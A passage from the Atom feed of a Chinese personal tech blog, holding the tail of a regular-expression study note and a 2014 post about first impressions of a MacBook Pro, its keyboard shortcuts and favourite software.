<li><code>\w</code> 表示“一个单词字符”，等同于<code>[0-9A-Za-z_]</code></li>
<li><code>\s</code> 表示“一个空格，tab，回车或一个换行符”</li>
<li>否定字符类：<code>[^abc] \D \W \S</code></li>
</ul>
</li>
<li>乘法器：<code>{4} {3,16} {1,} ? * +</code><ul>
<li><code>{3,16}</code> 表示找到重复 3 到 16 个前一个正则字符</li>
<li><code>?</code> 表示“没有或一个”</li>
<li><code>*</code> 表示“没有或多个”</li>
<li><code>+</code> 表示“一个或多个”</li>
<li>乘法器是贪婪的除非你在之后使用 <code>?</code> , 即优先找到最长的</li>
</ul>
</li>
<li>分支和组合：  <code>(Septem|Octo|Novem|Decem)ber</code><ul>
<li>管道符号 <code>|</code> 表示“或”</li>
<li>圆括号表示组合 ，比如 在一周中找到一天，使用 <code>(Mon|Tues|Wednes|Thurs|Fri|Satur|Sun)day</code>。</li>
</ul>
</li>
<li>词、行和文本边界： <ul>
<li><code>\b</code> 表示词边界  </li>
<li><code>^</code> 表示行开始 </li>
<li><code>$</code> 表示行结束</li>
<li><code>^$</code> 表示的就是空白行了</li>
</ul>
</li>
<li><p>反向捕获组：<code>\1 \2 \3</code> 等等。捕获组从左到右进行编号，只要计算左圆括号。（在替换表达式和匹配表达式中同时生效） </p>
<ul>
<li><p>比如有一段字符，我们需要前面的横杠去掉，尾巴的数字去掉， 英文句号换成中文顿号</p>
<p><figure class="highlight"><table><tr><td class="gutter"><pre>1
2
3
4
5
</pre></td><td class="code"><pre>-<span class="ruby"><span class="number">1</span>.文章标题<span class="number">1</span>
</span>-<span class="ruby"><span class="number">2</span>.文章标题<span class="number">2</span>
</span>-<span class="ruby"><span class="number">3</span>.文章标题<span class="number">3</span>
</span>-<span class="ruby"><span class="number">4</span>.文章标题<span class="number">4</span>
</span>-<span class="ruby"><span class="number">51</span>.文章标题<span class="number">5</span></span>
</pre></td></tr></table></figure><br>则可以使用正则表达式 <code>-(\d{1,})\.(.*)\d</code> 来匹配。然后使用 <code>\1、\2</code> 来替换。</p>
</li>
</ul>
</li>
<li><p>向后引用： 在同样的表达式中引用同一个捕获组。</p>
<ul>
<li>表达式 <code>(xi)\1(ha)\2</code>  能匹配 <code>xixihaha</code></li>
</ul>
</li>
<li>元字符列表：<code>. \ [ ] { } ? * + | ( ) ^ $</code></li>
<li>字符类中使用到元字符列表：<code>[ ] \ - ^</code></li>
<li>你总是可以使用反斜杆对元字符进行转义：<code>\</code><a id="more"></a>

</li>
</ul>
<h2 id="参考资料：">参考资料：</h2>
<p><a href="http://www.regexr.com/" target="_blank" rel="external">RegExr</a>：一款在线学习、构建和测试正则表达式的工具<br><a href="http://tryregex.com/" target="_blank" rel="external">TRY REGEX</a>：交互式正则表达式的教学网站<br><a href="http://doslin.com/learn-regular-expressions-in-about-55-minutes/" target="_blank" rel="external">55分钟学会正则表达式</a>：很好的入门文章</p>
]]></content>
    <summary type="html"><![CDATA[<p>最近在看鸟哥 Linux，看到正则表达式这块，以前看到这些恐怖的字符总是觉得恶心，今天就咬牙系统的学习了下正则表达式。然后有了这篇笔记。主要总结正则表达式的一些关键知识点。</p>
<ul>
<li>字面值：<code>a b c d 1 2 3 4</code> 等等。</li>
<li>字符类：<code>. [abc] [a-z] \d \w \s</code><ul>
<li><code>.</code> 表示“任何字符”</li>
<li><code>[abc]</code>  括号表示“找到集合里任意一个字符”。</li>
<li><code>\d</code> 表示“一个数字”，等同于<code>[0-9]</code></li>
<li><code>\w</code> 表示“一个单词字符”，等同于<code>[0-9A-Za-z_]</code></li>
<li><code>\s</code> 表示“一个空格，tab，回车或一个换行符”</li>
<li>否定字符类：<code>[^abc] \D \W \S</code></li>
</ul>
</li>
<li>乘法器：<code>{4} {3,16} {1,} ? * +</code><ul>
<li><code>{3,16}</code> 表示找到重复 3 到 16 个前一个正则字符</li>
<li><code>?</code> 表示“没有或一个”</li>
<li><code>*</code> 表示“没有或多个”</li>
<li><code>+</code> 表示“一个或多个”</li>
<li>乘法器是贪婪的除非你在之后使用 <code>?</code> , 即优先找到最长的</li>
</ul>
</li>
<li>分支和组合：  <code>(Septem|Octo|Novem|Decem)ber</code><ul>
<li>管道符号 <code>|</code> 表示“或”</li>
<li>圆括号表示组合 ，比如 在一周中找到一天，使用 <code>(Mon|Tues|Wednes|Thurs|Fri|Satur|Sun)day</code>。</li>
</ul>
</li>
<li>词、行和文本边界： <ul>
<li><code>\b</code> 表示词边界  </li>
<li><code>^</code> 表示行开始 </li>
<li><code>$</code> 表示行结束</li>
<li><code>^$</code> 表示的就是空白行了</li>
</ul>
</li>
<li><p>反向捕获组：<code>\1 \2 \3</code> 等等。捕获组从左到右进行编号，只要计算左圆括号。（在替换表达式和匹配表达式中同时生效） </p>
<ul>
<li><p>比如有一段字符，我们需要前面的横杠去掉，尾巴的数字去掉， 英文句号换成中文顿号</p>
<p><figure class="highlight"><table><tr><td class="gutter"><pre>1
2
3
4
5
</pre></td><td class="code"><pre>-<span class="ruby"><span class="number">1</span>.文章标题<span class="number">1</span>
</span>-<span class="ruby"><span class="number">2</span>.文章标题<span class="number">2</span>
</span>-<span class="ruby"><span class="number">3</span>.文章标题<span class="number">3</span>
</span>-<span class="ruby"><span class="number">4</span>.文章标题<span class="number">4</span>
</span>-<span class="ruby"><span class="number">51</span>.文章标题<span class="number">5</span></span>
</pre></td></tr></table></figure><br>则可以使用正则表达式 <code>-(\d{1,})\.(.*)\d</code> 来匹配。然后使用 <code>\1、\2</code> 来替换。</p>
</li>
</ul>
</li>
<li><p>向后引用： 在同样的表达式中引用同一个捕获组。</p>
<ul>
<li>表达式 <code>(xi)\1(ha)\2</code>  能匹配 <code>xixihaha</code></li>
</ul>
</li>
<li>元字符列表：<code>. \ [ ] { } ? * + | ( ) ^ $</code></li>
<li>字符类中使用到元字符列表：<code>[ ] \ - ^</code></li>
<li>你总是可以使用反斜杆对元字符进行转义：<code>\</code>]]></summary>
    
      <category term="正则表达式" scheme="http://wuchong.me/tags/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/"/>
    
      <category term="编程语言" scheme="http://wuchong.me/categories/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[Mac 初体验]]></title>
    <link href="http://wuchong.me/blog/2014/06/29/the-first-experience-of-mac/"/>
    <id>http://wuchong.me/blog/2014/06/29/the-first-experience-of-mac/</id>
    <published>2014-06-29T09:03:08.000Z</published>
    <updated>2014-12-22T16:18:37.000Z</updated>
    <content type="html"><![CDATA[<p><img src="http://ww4.sinaimg.cn/large/81b78497jw1ehv23tcyopj21kw0zkduo.jpg" alt=""></p>
<p>曾无比期盼在 2014 WWDC 上能见到搭载 Retina 的 air，结果竹篮打水一场空。之后 pro 的价格就扶摇直上。终于在本月17号的时候，忍不住入手了 rMBP 13 中配，用到现在也已经快两个星期了。这段时间也算是熟练了 Mac 上的基本操作，感叹苹果在追求用户体验的道路上已经领先国人不知道多少条街了。我入手的时候是买的港版总价9100元，现如今两个星期过去已经疯涨到9300了。也难怪，毕竟又一大批的高中生们马上买入校园，macbook 估计就成了首选，而且就 pro 的这款型号涨势最凶，看来大家都是奔着 Retina 去的，真是佩服我当时的明智！</p>
<p>用了这么久，谈谈我对本本的感受把。第一感觉就是超清！我当时因为纠结买 pro 还是 air 时，特地跑到体验店体验了一下午的 Retina，最后还是毅然选择了 pro。作为一个码农，与代码和文档一起度过的时间是仅次于女朋友的，看完如此养眼的 pro 后，几乎无法接受 air 了（当然两者的定位是不一样的）。第二个感觉是外观。虽然相比 air 的性感稍逊一筹，但是 pro 整体的外观还是很惊艳的，而且方方正正更凸现男人的大气。pro 的厚度是一致的，且比 air 最厚的地方仅多1毫米，重量比 air 重 0.22 kg。因此还是很便携的。相比于我的联想本本小Y，真是不想再碰了…第三个感觉就是用户体验很好。让我印象最深刻的是触控板的设置页面居然还有高清动画的效果演示，真是把体验做到了极致。另外，多快捷键、多点触控的操作使得在 mac 上的操作变得行云流水。</p>
<p>下面就说说我使用的这段时间觉得比较不错的一写快捷键把。<br><a id="more"></a></p>
<ol>
<li>截图。在 windows 上一般都借助 QQ 的截图。在 Mac 上，自带的截图就已经满足所有需求了。 cmd+shift+3 为全屏截图。cmd+shift+4 为区域截图，再单击空格键就成窗口截图了。在 windows 上能截出下面 shell 窗口的效果吗。</li>
<li>文本编辑。cmd+→ 为移动光标的行末，cmd+← 为移动光标到行首。 fn+del 为删除光标后的字符。</li>
<li>当前窗口。cmd+q 为退出当前窗口程序。cmd+m 为最小化当前窗口，cmd+w 为关闭当前窗口（相当于 win 上的最小化），cmd+tab 为切换窗口程序。</li>
<li>快速预览。选中文件，单击空格键。</li>
<li>返回桌面。在 windows 中经常使用的文件都在桌面上，想快速切回桌面一般使用 win+d，而在mac中使用四指划开就可以快速做到。</li>
<li>切换space。四指滑动可以切换space，在一个space里编码，另一个space里看文档，可以非常方便的进行切换。</li>
</ol>
<p>还有很多有用的技巧就不一一介绍了，苹果的 <a href="http://support.apple.com/kb/HT1343?viewlocale=zh_CN" target="_blank" rel="external">官方教程</a> 上有非常详细的介绍。</p>
<p><img src="http://ww2.sinaimg.cn/large/81b78497gw1ehuzf8nwhyj21200tc41e.jpg" alt=""></p>
<p>工欲善其事，必先利其器。下面就介绍下我在 mac 上常用的一些软件。</p>
<ol>
<li>首先肯定是 zsh。大部分 Linux 和 OS X 系统上默认安装的都是 bash，但是真正卧虎藏龙的高手是 zsh。上图就是 zsh 的运行界面。不妨 <a href="http://ohmyz.sh/" target="_blank" rel="external">尝试一下</a>。</li>
<li>浏览器。Safari 和 Chrome 其实都不错。前者有很不错的快捷键支持，后者外观方面更喜欢些。</li>
<li>笔记软件 Evernote。一直用的印象，而且多平台支持地也不错，mac 上自然就用他了。</li>
<li>影音播放 Mplayer X。支持各种格式，但 app store 上的版本较低还有问题，所以我去 <a href="http://mplayerx.org/" target="_blank" rel="external">官网</a> 上下了个。</li>
<li>markdown 编辑工具 Mou。之前都用的 <a href="https://www.zybuluo.com/mdeditor" target="_blank" rel="external">Cmd Markdown</a> ,体验了 Mou 后决定先用一段时候的 Mou。</li>
<li>代码编辑器 Sublime Text3 。这个不用说了。</li>
<li>翻墙工具 GoagentX。最近谷歌被封，不过实验室上谷歌还是嗖嗖的，不知其因。所以翻墙用的比较少。</li>
</ol>
<p>总之，还是那句话「早买早享受」，Mac 给我的感受就是值得拥有！</p>
<p>另外推荐一本书 池建强写的 《MacTalk 人生元编程》。</p>
<p>-END-</p>
]]></content>
    <summary type="html"><![CDATA[<p><img src="http://ww4.sinaimg.cn/large/81b78497jw1ehv23tcyopj21kw0zkduo.jpg" alt=""></p>
<p>曾无比期盼在 2014 WWDC 上能见到搭载 Retina 的 air，结果竹篮打水一场空。之后 pro 的价格就扶摇直上。终于在本月17号的时候，忍不住入手了 rMBP 13 中配，用到现在也已经快两个星期了。这段时间也算是熟练了 Mac 上的基本操作，感叹苹果在追求用户体验的道路上已经领先国人不知道多少条街了。我入手的时候是买的港版总价9100元，现如今两个星期过去已经疯涨到9300了。也难怪，毕竟又一大批的高中生们马上买入校园，macbook 估计就成了首选，而且就 pro 的这款型号涨势最凶，看来大家都是奔着 Retina 去的，真是佩服我当时的明智！</p>
<p>用了这么久，谈谈我对本本的感受把。第一感觉就是超清！我当时因为纠结买 pro 还是 air 时，特地跑到体验店体验了一下午的 Retina，最后还是毅然选择了 pro。作为一个码农，与代码和文档一起度过的时间是仅次于女朋友的，看完如此养眼的 pro 后，几乎无法接受 air 了（当然两者的定位是不一样的）。第二个感觉是外观。虽然相比 air 的性感稍逊一筹，但是 pro 整体的外观还是很惊艳的，而且方方正正更凸现男人的大气。pro 的厚度是一致的，且比 air 最厚的地方仅多1毫米，重量比 air 重 0.22 kg。因此还是很便携的。相比于我的联想本本小Y，真是不想再碰了…第三个感觉就是用户体验很好。让我印象最深刻的是触控板的设置页面居然还有高清动画的效果演示，真是把体验做到了极致。另外，多快捷键、多点触控的操作使得在 mac 上的操作变得行云流水。</p>
<p>下面就说说我使用的这段时间觉得比较不错的一写快捷键把。<br>]]></summary>
    
      <category term="Mac" scheme="http://wuchong.me/tags/Mac/"/>
    
      <category term="生活" scheme="http://wuchong.me/tags/%E7%94%9F%E6%B4%BB/"/>
    
      <category term="Linux/Unix" scheme="http://wuchong.me/categories/LinuxUnix/"/>
    
  </entry>
  
</feed>
